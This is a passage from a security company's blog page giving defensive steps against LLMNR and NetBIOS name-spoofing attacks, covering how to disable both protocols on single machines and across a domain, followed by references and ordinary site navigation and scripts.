+<ul><li>Disable LLMNR and&nbsp;NBT-NS. &nbsp;You need to disable both because if LLMNR is disabled, it will automatically attempt to use NBT-NS instead. &nbsp;See the instructions below.</li><li>Prevent inter-VLAN communication &#8211; By limiting communication between hosts on the same network, you greatly reduce the success of most local network attacks.</li><li>Use limited user accounts &#8211; Now this won’t prevent an attack, but it will limit the damage that a successful attack can do and at least make an attacker work harder.&nbsp; For example, if the victim is using &#8220;domain admin&#8221; credentials, then a successful attack would give up the access to all machines on the network.&nbsp; On the other hand, if the victim is using a limited account, then the attacker will need to work harder to get further access in the environment.</li></ul>
+
+
+
+<p><strong>To disable LLMNR on windows:</strong></p>
+
+
+
+<ol><li>Click Start</li><li>Type<strong> gpedit.msc</strong> in the text box&nbsp;</li><li>Navigate to Local Computer Policy -&gt; Computer Configuration -&gt; Administrative Templates -&gt; Network -&gt; DNS Client</li><li>In the DNS Client Folder, double click on “<strong>Turn Off Multicast Name Resolution</strong>” and set it to “<strong>Enabled</strong>”</li></ol>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" width="976" height="634" src="https://www.sternsecurity.com/wp-content/uploads/2020/11/multicast-policy.png" alt="" class="wp-image-2975" srcset="https://www.sternsecurity.com/wp-content/uploads/2020/11/multicast-policy.png 976w, https://www.sternsecurity.com/wp-content/uploads/2020/11/multicast-policy-300x195.png 300w, https://www.sternsecurity.com/wp-content/uploads/2020/11/multicast-policy-768x499.png 768w, https://www.sternsecurity.com/wp-content/uploads/2020/11/multicast-policy-720x468.png 720w" sizes="(max-width: 976px) 100vw, 976px" /></figure>
+
+
+
+<p>The following registry key is set on computers when LLMNR is disabled:<br>HKLM\Software\Policies\Microsoft\Windows NT\DNSClient<br>&#8220;EnableMulticast&#8221; DWORD 0</p>
+
+
+
+<p><strong>To disable NetBIOS Name Service on a single machine:</strong></p>
+
+
+
+<ol><li>Open Control Panel</li><li>Under &#8220;Network and Internet”, click &#8220;View network status and tasks”</li><li>Click&nbsp;“Change adapter settings”</li><li>Right-click “Local area connection” and then click “Properties”</li><li>Double-click on “Internet Protocol Version 4 (TCP/IPv4)”, click “Advanced” then click on the “WINS” (Windows Internet Name Service) tab</li><li>Click on “Disable NetBIOS over TCP/IP&#8221;</li></ol>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" width="409" height="489" src="https://www.sternsecurity.com/wp-content/uploads/2020/11/disable_nbns2-highlight.png" alt="" class="wp-image-2976" srcset="https://www.sternsecurity.com/wp-content/uploads/2020/11/disable_nbns2-highlight.png 409w, https://www.sternsecurity.com/wp-content/uploads/2020/11/disable_nbns2-highlight-251x300.png 251w" sizes="(max-width: 409px) 100vw, 409px" /></figure>
+
+
+
+<p><strong>To disable NetBIOS Name Service across a domain with DHCP clients:</strong></p>
+
+
+
+<ol><li>Go to the DHCP Snap-In</li><li>Go to &#8220;scope options&#8221; for the network you are changing</li><li>Right click and Configure Options</li><li>Select Advanced tab and change &#8220;Vendor class&#8221; to &#8220;Microsoft Windows 2000 Options&#8221;.</li><li>In the &#8220;Available Options&#8221; frame, select and check the box &#8220;001 Microsoft Disable Netbios Option&#8221;</li><li>In the &#8220;Data Entry&#8221; frame, change the data entry to 0x2</li><li>Click &#8220;OK&#8221;.&nbsp; The new settings will take affect when the clients renew their addresses.</li></ol>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" width="414" height="461" src="https://www.sternsecurity.com/wp-content/uploads/2020/11/disable-netbios-domain.png" alt="" class="wp-image-2977" srcset="https://www.sternsecurity.com/wp-content/uploads/2020/11/disable-netbios-domain.png 414w, https://www.sternsecurity.com/wp-content/uploads/2020/11/disable-netbios-domain-269x300.png 269w" sizes="(max-width: 414px) 100vw, 414px" /></figure>
+
+
+
+<p>Disabling NetBios through DHCP configuration (Fine, 2011)</p>
+
+
+
+<h3>References</h3>
+
+
+
+<p>1.&nbsp;McGrew, Wesley. (2007, March 22). NetBIOS Name Service Spoofing.&nbsp;<a rel="noreferrer noopener" href="http://www.mcgrewsecurity.com/2007/03/22/netbios-name-service-spoofing/" target="_blank">http://www.mcgrewsecurity.com/2007/03/22/netbios-name-service-spoofing/</a><br>2. Gaffie, Laurent. (2012, October 24). Introducing Responder-1.0.&nbsp;<a rel="noreferrer noopener" href="http://blog.spiderlabs.com/2012/10/introducing-responder-10.html" target="_blank">http://blog.spiderlabs.com/2012/10/introducing-responder-10.html</a><br>3. Fine, P. (2011, January 13). So long NetBIOS, it’s been fun! Retrieved from Exit | the | Fast | Lane: http://www.exitthefastlane.com/2011/01/so-long-netbios-its-been-fun.html</p>
+
+        </div><!-- .entry-content -->
+        <div class="entry-footer clearfix">
+            <span class="sl-wrapper"><a href="https://www.sternsecurity.com/wp-admin/admin-ajax.php?action=process_simple_like&post_id=2970&nonce=1b884c6e5b&is_comment=0&disabled=true" class="sl-button sl-button-2970" data-nonce="1b884c6e5b" data-post-id="2970" data-iscomment="0" title="Like"><span class="sl-icon"><svg role="img" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0" y="0" viewBox="0 0 128 128" enable-background="new 0 0 128 128" xml:space="preserve"><path id="heart" d="M64 127.5C17.1 79.9 3.9 62.3 1 44.4c-3.5-22 12.2-43.9 36.7-43.9 10.5 0 20 4.2 26.4 11.2 6.3-7 15.9-11.2 26.4-11.2 24.3 0 40.2 21.8 36.7 43.9C124.2 62 111.9 78.9 64 127.5zM37.6 13.4c-9.9 0-18.2 5.2-22.3 13.8C5 49.5 28.4 72 64 109.2c35.7-37.3 59-59.8 48.6-82 -4.1-8.7-12.4-13.8-22.3-13.8 -15.9 0-22.7 13-26.4 19.2C60.6 26.8 54.4 13.4 37.6 13.4z"/>&#9829;</svg></span><span class="sl-count">69</a><span id="sl-loader"></span></span>        </div>
+        <div class="share-post"></div>        <div class="author-bio" ><div class="author-image"><img alt='' src='https://secure.gravatar.com/avatar/c4adff83e77902e2f6910394f60d33fb?s=250&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/c4adff83e77902e2f6910394f60d33fb?s=500&#038;d=mm&#038;r=g 2x' class='avatar avatar-250 photo' height='250' width='250' loading='lazy'/></div><div class="author-info"><p class="title text-primary font-second">Author</p><h6>Webmaster</h6><p class="des"></p><div class="author-socials"></div></div></div>        <div class="post-nav clearfix"><div class="post-next"><a href="https://www.sternsecurity.com/blog/how-to-protect-your-email-account-with-two-factor-authentication/" rel="next"><h6>How to protect your email account with two-factor authentication</h6><span>March 9, 2014</span></a></div></div>    </div>
+</article>
+
+					</main><!-- #main -->
+				</div><!-- #primary -->
+				
+				
+<aside id="primary-sidebar" class="widget-area primary-sidebar col-lg-3 col-md-3 col-sm-12 col-xs-12">
+	<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://www.sternsecurity.com/" >
+    <label><span class="screen-reader-text">Search for:</span>
+    <input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" /></label>
+	<button type="submit" class="search-submit"><i class="flaticon-search"></i></button>
+    </form></section>
+		<section id="recent-posts-2" class="widget widget_recent_entries">
+		<h5 class="widget-title">Recent Posts</h5>
+		<ul>
+											<li>
+					<a href="https://www.sternsecurity.com/blog/the-triangle-net-interviews-jon-sternstein/">The Triangle Net Interviews Jon Sternstein</a>
+									</li>
+											<li>
+					<a href="https://www.sternsecurity.com/blog/vendor-risk-management-accuracy-matters/">Vendor Risk Management Accuracy &#8211; Are You Hitting the Mark?</a>
+									</li>
+											<li>
+					<a href="https://www.sternsecurity.com/blog/still-using-spreadsheets-to-measure-vendor-risk/">Still Using Spreadsheets to Measure Vendor Risk?</a>
+									</li>
+											<li>
+					<a href="https://www.sternsecurity.com/blog/vendor-risk-a-growing-concern/">Vendor Risk Management – A Growing Concern</a>
+									</li>
+											<li>
+					<a href="https://www.sternsecurity.com/blog/cbs17-hackers-targeting-hospitals-amid-covid-19-case-surge-fbi-warns/">CBS17: Hackers targeting hospitals amid COVID-19 case surge, FBI warns</a>
+									</li>
+					</ul>
+
+		</section><section id="nav_menu-2" class="widget widget_nav_menu"><h5 class="widget-title">Footer Navigation</h5><div class="menu-footer-menu-container"><ul id="menu-footer-menu" class="menu"><li id="menu-item-3101" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-3101"><a href="https://www.sternsecurity.com/">Home</a></li>
+<li id="menu-item-3092" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3092"><a href="https://www.sternsecurity.com/about-us/">About Us</a></li>
+<li id="menu-item-3100" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3100"><a href="https://www.sternsecurity.com/privacy-guidelines/">Privacy Guidelines</a></li>
+<li id="menu-item-3093" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3093"><a href="https://www.sternsecurity.com/contact/">Contact Us</a></li>
+<li id="menu-item-3099" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3099"><a href="https://www.sternsecurity.com/careers/">Careers</a></li>
+</ul></div></section></aside><!-- #secondary -->
+			</div>
+		</div>	
+	</div>
+
+	</div><!-- #content -->
+	<footer id="site-footer" class="site-footer" itemscope="itemscope" itemtype="http://schema.org/WPFooter">		<div data-elementor-type="wp-post" data-elementor-id="1308" class="elementor elementor-1308" data-elementor-settings="[]">
+						<div class="elementor-inner">
+							<div class="elementor-section-wrap">
+							<section class="elementor-section elementor-top-section elementor-element elementor-element-d0f9bfa ot-traditional elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="d0f9bfa" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-extended">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-89daaf1 ot-flex-column-vertical" data-id="89daaf1" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;slideshow&quot;,&quot;background_slideshow_gallery&quot;:[],&quot;background_slideshow_loop&quot;:&quot;yes&quot;,&quot;background_slideshow_slide_duration&quot;:5000,&quot;background_slideshow_slide_transition&quot;:&quot;fade&quot;,&quot;background_slideshow_transition_duration&quot;:500}">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-6057167 elementor-widget elementor-widget-image" data-id="6057167" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+								<div class="elementor-image">
+												<img width="165" height="88" src="https://www.sternsecurity.com/wp-content/uploads/2019/12/Stern-Logo-for-Dark-Backgrounds-small2.png" class="attachment-large size-large" alt="" loading="lazy" />														</div>
+						</div>
+				</div>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-e89c64b elementor-section-full_width ot-traditional elementor-section-height-default elementor-section-height-default" data-id="e89c64b" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-extended">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-8d8441e ot-flex-column-vertical" data-id="8d8441e" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-8914b33 elementor-widget elementor-widget-icontact_info" data-id="8914b33" data-element_type="widget" data-widget_type="icontact_info.default">
+				<div class="elementor-widget-container">
+										<div class="contact-info box-style2">
+					<div class="box-icon">
+									    				        		<i class="flaticon-world-globe"></i>					</div>
+		        	<p>6300 Creedmoor Rd
+Suite 170 #213<br/>
+Raleigh, NC</p>
+		        	<h6>Our Address</h6>			        				        
+			    </div>
+		    	    		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-c9201b5 ot-flex-column-vertical" data-id="c9201b5" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-ad7e989 elementor-widget elementor-widget-icontact_info" data-id="ad7e989" data-element_type="widget" data-widget_type="icontact_info.default">
+				<div class="elementor-widget-container">
+										<div class="contact-info box-style2">
+					<div class="box-icon">
+						<i aria-hidden="true" class="fas fa-phone-alt"></i>			    				        							</div>
+		        	<p><a href="tel:9198867685">919.886.7685</a></p>
+		        	<h6>Our Phone</h6>			        				        
+			    </div>
+		    	    		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<div class="elementor-element elementor-element-c208bbf elementor-widget elementor-widget-text-editor" data-id="c208bbf" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+								<div class="elementor-text-editor elementor-clearfix">
+					<p>Copyright © 2021. All Rights Reserved.</p>					</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-9438214 elementor-grid-5 elementor-shape-rounded e-grid-align-center elementor-widget elementor-widget-social-icons" data-id="9438214" data-element_type="widget" data-widget_type="social-icons.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-social-icons-wrapper elementor-grid">
+							<div class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-twitter elementor-animation-float elementor-repeater-item-a24d46e" href="https://twitter.com/stern_security" target="_blank">
+						<span class="elementor-screen-only">Twitter</span>
+						<i class="fab fa-twitter"></i>					</a>
+				</div>
+							<div class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-linkedin-in elementor-animation-float elementor-repeater-item-b0dbeaa" href="https://www.linkedin.com/company/sternsecurity" target="_blank">
+						<span class="elementor-screen-only">Linkedin-in</span>
+						<i class="fab fa-linkedin-in"></i>					</a>
+				</div>
+							<div class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-instagram elementor-animation-float elementor-repeater-item-ab5d024" href="https://www.instagram.com/sternsec/" target="_blank">
+						<span class="elementor-screen-only">Instagram</span>
+						<i class="fab fa-instagram"></i>					</a>
+				</div>
+							<div class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-facebook elementor-animation-float elementor-repeater-item-6868d59" href="https://www.facebook.com/sternsec" target="_blank">
+						<span class="elementor-screen-only">Facebook</span>
+						<i class="fab fa-facebook"></i>					</a>
+				</div>
+							<div class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-vimeo elementor-animation-float elementor-repeater-item-f04cf29" href="https://vimeo.com/sternsecurity" target="_blank">
+						<span class="elementor-screen-only">Vimeo</span>
+						<i class="fab fa-vimeo"></i>					</a>
+				</div>
+					</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-eac026f ot-traditional elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="eac026f" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-extended">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-e1408d7 ot-flex-column-vertical" data-id="e1408d7" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;slideshow&quot;,&quot;background_slideshow_gallery&quot;:[],&quot;background_slideshow_loop&quot;:&quot;yes&quot;,&quot;background_slideshow_slide_duration&quot;:5000,&quot;background_slideshow_slide_transition&quot;:&quot;fade&quot;,&quot;background_slideshow_transition_duration&quot;:500}">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-fbf8dc1 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="fbf8dc1" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-e605aee footer-menu elementor-hidden-phone elementor-widget elementor-widget-wp-widget-nav_menu" data-id="e605aee" data-element_type="widget" id="footer-menu" data-widget_type="wp-widget-nav_menu.default">
+				<div class="elementor-widget-container">
+			<div class="menu-footer-menu-container"><ul id="menu-footer-menu-1" class="menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-3101"><a href="https://www.sternsecurity.com/">Home</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3092"><a href="https://www.sternsecurity.com/about-us/">About Us</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3100"><a href="https://www.sternsecurity.com/privacy-guidelines/">Privacy Guidelines</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3093"><a href="https://www.sternsecurity.com/contact/">Contact Us</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3099"><a href="https://www.sternsecurity.com/careers/">Careers</a></li>
+</ul></div>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+						</div>
+						</div>
+					</div>
+		</footer></div><!-- #page -->
+
+<a id="back-to-top" href="#" class="show"><i class="flaticon-up-arrow"></i></a><link rel='stylesheet' id='elementor-frontend-legacy-css'  href='https://www.sternsecurity.com/wp-content/plugins/elementor/assets/css/frontend-legacy.min.css?ver=3.2.3' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-frontend-css'  href='https://www.sternsecurity.com/wp-content/plugins/elementor/assets/css/frontend.min.css?ver=3.2.3' type='text/css' media='all' />
+<style id='elementor-frontend-inline-css' type='text/css'>
+@font-face{font-family:eicons;src:url(https://www.sternsecurity.com/wp-content/plugins/elementor/assets/lib/eicons/fonts/eicons.eot?5.10.0);src:url(https://www.sternsecurity.com/wp-content/plugins/elementor/assets/lib/eicons/fonts/eicons.eot?5.10.0#iefix) format("embedded-opentype"),url(https://www.sternsecurity.com/wp-content/plugins/elementor/assets/lib/eicons/fonts/eicons.woff2?5.10.0) format("woff2"),url(https://www.sternsecurity.com/wp-content/plugins/elementor/assets/lib/eicons/fonts/eicons.woff?5.10.0) format("woff"),url(https://www.sternsecurity.com/wp-content/plugins/elementor/assets/lib/eicons/fonts/eicons.ttf?5.10.0) format("truetype"),url(https://www.sternsecurity.com/wp-content/plugins/elementor/assets/lib/eicons/fonts/eicons.svg?5.10.0#eicon) format("svg");font-weight:400;font-style:normal}
+</style>
+<link rel='stylesheet' id='elementor-post-2843-css'  href='https://www.sternsecurity.com/wp-content/uploads/elementor/css/post-2843.css?ver=1621715961' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-post-2854-css'  href='https://www.sternsecurity.com/wp-content/uploads/elementor/css/post-2854.css?ver=1621351645' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-post-2856-css'  href='https://www.sternsecurity.com/wp-content/uploads/elementor/css/post-2856.css?ver=1621351645' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-post-1308-css'  href='https://www.sternsecurity.com/wp-content/uploads/elementor/css/post-1308.css?ver=1621716084' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-icons-css'  href='https://www.sternsecurity.com/wp-content/plugins/elementor/assets/lib/eicons/css/elementor-icons.min.css?ver=5.11.0' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-animations-css'  href='https://www.sternsecurity.com/wp-content/plugins/elementor/assets/lib/animations/animations.min.css?ver=3.2.3' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-post-2894-css'  href='https://www.sternsecurity.com/wp-content/uploads/elementor/css/post-2894.css?ver=1621351645' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-pro-css'  href='https://www.sternsecurity.com/wp-content/plugins/elementor-pro/assets/css/frontend.min.css?ver=3.2.2' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-global-css'  href='https://www.sternsecurity.com/wp-content/uploads/elementor/css/global.css?ver=1621351645' type='text/css' media='all' />
+<link rel='stylesheet' id='google-fonts-1-css'  href='https://fonts.googleapis.com/css?family=Nunito+Sans%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CNunito%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CMontserrat%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CRoboto%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CRoboto+Slab%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&#038;display=auto&#038;ver=5.7.2' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-icons-shared-0-css'  href='https://www.sternsecurity.com/wp-content/plugins/elementor/assets/lib/font-awesome/css/fontawesome.min.css?ver=5.15.1' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-icons-fa-solid-css'  href='https://www.sternsecurity.com/wp-content/plugins/elementor/assets/lib/font-awesome/css/solid.min.css?ver=5.15.1' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-icons-fa-brands-css'  href='https://www.sternsecurity.com/wp-content/plugins/elementor/assets/lib/font-awesome/css/brands.min.css?ver=5.15.1' type='text/css' media='all' />
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type='text/javascript' src='https://www.sternsecurity.com/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=7.4.4' id='wp-polyfill-js'></script>
+<script type='text/javascript' id='wp-polyfill-js-after'>
+( 'fetch' in window ) || document.write( '<script src="https://www.sternsecurity.com/wp-includes/js/dist/vendor/wp-polyfill-fetch.min.js?ver=3.0.0"></scr' + 'ipt>' );( document.contains ) || document.write( '<script src="https://www.sternsecurity.com/wp-includes/js/dist/vendor/wp-polyfill-node-contains.min.js?ver=3.42.0"></scr' + 'ipt>' );( window.DOMRect ) || document.write( '<script src="https://www.sternsecurity.com/wp-includes/js/dist/vendor/wp-polyfill-dom-rect.min.js?ver=3.42.0"></scr' + 'ipt>' );( window.URL && window.URL.prototype && window.URLSearchParams ) || document.write( '<script src="https://www.sternsecurity.com/wp-includes/js/dist/vendor/wp-polyfill-url.min.js?ver=3.6.4"></scr' + 'ipt>' );( window.FormData && window.FormData.prototype.keys ) || document.write( '<script src="https://www.sternsecurity.com/wp-includes/js/dist/vendor/wp-polyfill-formdata.min.js?ver=3.0.12"></scr' + 'ipt>' );( Element.prototype.matches && Element.prototype.closest ) || document.write( '<script src="https://www.sternsecurity.com/wp-includes/js/dist/vendor/wp-polyfill-element-closest.min.js?ver=2.0.2"></scr' + 'ipt>' );( 'objectFit' in document.documentElement.style ) || document.write( '<script src="https://www.sternsecurity.com/wp-includes/js/dist/vendor/wp-polyfill-object-fit.min.js?ver=2.3.4"></scr' + 'ipt>' );
+</script>
+<script type='text/javascript' id='contact-form-7-js-extra'>
+/* <![CDATA[ */
+var wpcf7 = {"api":{"root":"https:\/\/www.sternsecurity.com\/wp-json\/","namespace":"contact-form-7\/v1"}};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.4.1' id='contact-form-7-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/themes/engitech/js/royal_preloader.min.js?ver=20180910' id='royal-preloader-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-includes/js/imagesloaded.min.js?ver=4.1.4' id='imagesloaded-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/themes/engitech/js/jquery.magnific-popup.min.js?ver=20180910' id='magnific-popup-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/themes/engitech/js/jquery.isotope.min.js?ver=20190829' id='isotope-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/themes/engitech/js/slick.min.js?ver=20180910' id='slick-slider-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/themes/engitech/js/easypiechart.min.js?ver=20190829' id='easypiechart-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/themes/engitech/js/jquery.countdown.min.js?ver=20180910' id='countdown-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/themes/engitech/js/elementor.js?ver=20180910' id='engitech-elementor-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/themes/engitech/js/elementor-header.js?ver=20180910' id='engitech-elementor-header-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/themes/engitech/js/scripts.js?ver=20180910' id='engitech-scripts-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/themes/engitech/js/header-mobile.js?ver=20180910' id='engitech-header-mobile-scripts-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-includes/js/wp-embed.min.js?ver=5.7.2' id='wp-embed-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/plugins/elementor-pro/assets/js/webpack-pro.runtime.min.js?ver=3.2.2' id='elementor-pro-webpack-runtime-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=3.2.3' id='elementor-webpack-runtime-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=3.2.3' id='elementor-frontend-modules-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/plugins/elementor-pro/assets/lib/sticky/jquery.sticky.min.js?ver=3.2.2' id='elementor-sticky-js'></script>
+<script type='text/javascript' id='elementor-pro-frontend-js-before'>
+var ElementorProFrontendConfig = {"ajaxurl":"https:\/\/www.sternsecurity.com\/wp-admin\/admin-ajax.php","nonce":"9359f0d5e4","urls":{"assets":"https:\/\/www.sternsecurity.com\/wp-content\/plugins\/elementor-pro\/assets\/"},"i18n":{"toc_no_headings_found":"No headings were found on this page."},"shareButtonsNetworks":{"facebook":{"title":"Facebook","has_counter":true},"twitter":{"title":"Twitter"},"google":{"title":"Google+","has_counter":true},"linkedin":{"title":"LinkedIn","has_counter":true},"pinterest":{"title":"Pinterest","has_counter":true},"reddit":{"title":"Reddit","has_counter":true},"vk":{"title":"VK","has_counter":true},"odnoklassniki":{"title":"OK","has_counter":true},"tumblr":{"title":"Tumblr"},"digg":{"title":"Digg"},"skype":{"title":"Skype"},"stumbleupon":{"title":"StumbleUpon","has_counter":true},"mix":{"title":"Mix"},"telegram":{"title":"Telegram"},"pocket":{"title":"Pocket","has_counter":true},"xing":{"title":"XING","has_counter":true},"whatsapp":{"title":"WhatsApp"},"email":{"title":"Email"},"print":{"title":"Print"}},"facebook_sdk":{"lang":"en_US","app_id":""},"lottie":{"defaultAnimationUrl":"https:\/\/www.sternsecurity.com\/wp-content\/plugins\/elementor-pro\/modules\/lottie\/assets\/animations\/default.json"}};
+</script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/plugins/elementor-pro/assets/js/frontend.min.js?ver=3.2.2' id='elementor-pro-frontend-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/plugins/elementor/assets/lib/waypoints/waypoints.min.js?ver=4.0.2' id='elementor-waypoints-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-includes/js/jquery/ui/core.min.js?ver=1.12.1' id='jquery-ui-core-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/plugins/elementor/assets/lib/swiper/swiper.min.js?ver=5.3.6' id='swiper-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/plugins/elementor/assets/lib/share-link/share-link.min.js?ver=3.2.3' id='share-link-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/plugins/elementor/assets/lib/dialog/dialog.min.js?ver=4.8.1' id='elementor-dialog-js'></script>
+<script type='text/javascript' id='elementor-frontend-js-before'>
+var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Share on Facebook","shareOnTwitter":"Share on Twitter","pinIt":"Pin it","download":"Download","downloadImage":"Download image","fullscreen":"Fullscreen","zoom":"Zoom","share":"Share","playVideo":"Play Video","previous":"Previous","next":"Next","close":"Close"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile","value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Extra","value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet","value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet 